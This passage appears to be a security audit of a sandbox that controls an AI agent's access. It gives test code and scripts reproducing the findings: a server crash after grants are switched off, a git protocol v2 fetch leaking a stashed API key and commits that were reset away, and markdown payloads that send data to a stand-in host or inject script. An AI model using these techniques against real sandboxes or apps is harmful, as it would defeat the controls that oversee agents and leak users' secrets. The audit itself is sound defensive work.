  s.connect(address[len("UNIX-CONNECT:"):])
  s.sendall(data)
  while True:
      chunk = s.recv(65536)
      if not chunk:
          break
      sys.stdout.buffer.write(chunk)
  """

  setup do
    base = Path.join(System.tmp_dir!(), "mwt-crashprobe-#{System.unique_integer([:positive])}")
    bin = Path.join(base, "bin")
    share = Path.join(base, "share")
    File.mkdir_p!(bin)
    File.mkdir_p!(Path.join(share, "proj"))
    File.write!(Path.join(bin, "socat"), @fake_socat)
    File.chmod!(Path.join(bin, "socat"), 0o755)
    on_exit(fn -> File.rm_rf!(base) end)

    "crashprobe"
    |> MWTClient.VaultHelpers.unlocked_identity()
    |> Map.merge(%{bin: bin, share: share})
  end

  defp states(username) do
    for grant <- Sandbox.snapshot(username).grants,
        grant.id in ["internet", "mwt-read", "mwt-create", "git-fetch", "commands"],
        into: %{},
        do: {grant.id, {grant.state, grant.start, length(grant.allowances)}}
  end

  test "a propose with --dir in a share, after the user turned grants off", context do
    username = context.username
    :ok = Sandbox.add_share(username, context.share) |> elem(0)
    IO.inspect(states(username), label: "as MWT started   ")

    {:ok, _} = Sandbox.turn_off(username, "internet")
    {:ok, _} = Sandbox.turn_off(username, "mwt-read")
    IO.inspect(states(username), label: "after you turn off")

    pid = Store.whereis(Server, username)
    ref = Process.monitor(pid)

    capture_log(fn ->
      {out, status} =
        System.cmd(
          "bash",
          [@cli, "propose", "commands", "--name", "x", "--for", "y", "--reason", "r"] ++
            ["--dir", Path.join(context.share, "proj"), "--wait", "0", "--", "echo a"],
          env: [
            {"PATH", context.bin <> ":" <> System.get_env("PATH")},
            {"MWT_CHANNEL", "UNIX-CONNECT:" <> Channel.socket_path(username)},
            {"MWT_AGENT", "claude"},
            {"MWT_THREAD", "t"}
          ],
          stderr_to_stdout: true
        )

      IO.puts("mwt propose said (exit #{status}): #{String.trim(out)}")
      assert_receive {:DOWN, ^ref, :process, ^pid, reason}, 5_000
      IO.puts("sandbox server DOWN: #{inspect(reason) |> String.slice(0, 200)}")
    end)

    _ = :sys.get_state(Store.supervisor(username))
    assert Store.whereis(Server, username) not in [nil, pid]
    IO.inspect(states(username), label: "after the restart ")
  end
end
```

### Finding 2: an object asked for by id under protocol v2

```elixir
defmodule MWTClient.Sandbox.ZzV2ProbeTest do
  use MWTClient.HandoffsCase, async: true

  alias MWTClient.Sandbox.{Channel, Project, Server}

  @helper Path.expand("../../../priv/sandbox/mwt-git-remote", __DIR__)

  setup context do
    project = %Project{name: "app", path: context.repo, mirrored_branch: "master"}
    {:ok, project} = Server.call(context.username, {:add_project, project})
    bin = Path.join(context.base, "git-bin")
    File.mkdir!(bin)
    fake_socat!(bin)
    File.cp!(@helper, Path.join(bin, "git-remote-mwt"))
    File.chmod!(Path.join(bin, "git-remote-mwt"), 0o755)

    %{
      project: project,
      remote: Project.remote_url(project),
      clone: Path.join(context.base, "clone"),
      env:
        git_env() ++
          [
            {"PATH", bin <> ":" <> System.get_env("PATH")},
            {"MWT_CHANNEL", "UNIX-CONNECT:" <> Channel.socket_path(context.username)}
          ]
    }
  end

  test "a stash and a commit reset away, asked for by id under protocol v2", context do
    File.write!(Path.join(context.repo, "secret.env"), "API_KEY=only-in-the-stash\n")
    git(context.repo, ["add", "secret.env"])
    git(context.repo, ["stash", "push", "-q", "-m", "wip"])
    stash = sha(context.repo, "refs/stash")

    File.write!(Path.join(context.repo, "oops.txt"), "amended away\n")
    git(context.repo, ["add", "oops.txt"])
    git(context.repo, ["commit", "-q", "-m", "oops"])
    dangling = sha(context.repo, "HEAD")
    git(context.repo, ["reset", "-q", "--hard", "HEAD~1"])

    assert {refs, 0} = remote_git(context, context.base, ["ls-remote", context.remote], [])
    refute refs =~ stash
    refute refs =~ dangling

    assert {_, 0} = remote_git(context, context.base, ["clone", context.remote, context.clone], [])

    for {name, oid, path} <- [{"stash", stash, "secret.env"}, {"dangling", dangling, "oops.txt"}] do
      {v0_out, v0} = remote_git(context, context.clone, ["fetch", "origin", oid], [])

      # The fetch stalls once the pack is in, so it runs under a time limit.
      {_trace, v2} =
        System.cmd(
          "timeout",
          ["--kill-after=2", "20", "git", "-C", context.clone, "fetch", "origin", oid],
          env: context.env ++ [{"GIT_PROTOCOL", "version=2"}],
          stderr_to_stdout: true
        )

      {content, shown} =
        System.cmd("git", ["-C", context.clone, "cat-file", "-p", "#{oid}:#{path}"],
          env: context.env,
          stderr_to_stdout: true
        )

      IO.puts("""

      #{name} #{oid}
        default protocol: exit #{v0}: #{String.trim(v0_out)}
        GIT_PROTOCOL=version=2: exit #{v2}
        #{path} in the clone: exit #{shown}: #{String.trim(content)}
      """)
    end
  end

  defp remote_git(context, dir, args, extra) do
    System.cmd("git", ["-C", dir | args], env: context.env ++ extra, stderr_to_stdout: true)
  end
end
```

### Finding 2: the ids a handoff's fetch offers

Plain git, in an empty folder. The last line counts the `have` lines that
carry the stash's id and the remote-tracking branch's.

```bash
G="git -c user.name=t -c user.email=t@t"
git init -q -b main user && cd user
echo one > a.txt && git add a.txt && $G commit -q -m base
echo "API_KEY=only-in-the-stash" > secret.env && git add secret.env && $G stash push -q -m wip
STASH=$(git rev-parse refs/stash)
echo two >> a.txt && $G commit -q -am "colleague work"
COLLEAGUE=$(git rev-parse HEAD) && git reset -q --hard HEAD~1
git update-ref refs/remotes/origin/colleague $COLLEAGUE
cd ..
git clone -q user vm && cd vm && echo vm > vm.txt && git add vm.txt && $G commit -q -m "vm work"
VMHEAD=$(git rev-parse HEAD) && cd ..
git init -q --bare store
echo "$PWD/user/.git/objects" > store/objects/info/alternates
GIT_TRACE_PACKET=1 git -C store -c fetch.fsckObjects=true -c transfer.fsckObjects=true \
  -c fetch.recurseSubmodules=false fetch --no-tags --no-write-fetch-head \
  "$PWD/vm" "+$VMHEAD:refs/handoffs/1" 2> trace.txt
grep -c -e "fetch> have $STASH" -e "fetch> have $COLLEAGUE" trace.txt
```

### Finding 5: the renderer's output

```bash
mix run --no-start -e '
IO.puts(MWTClient.Markdown.to_html("""
![status](http://127.0.0.1:8080/admin?do=1) ![b](https://example.invalid/p.gif?d=c2VjcmV0)
[l](javascript:alert(1)) <script>alert(1)</script>
"""))'
```
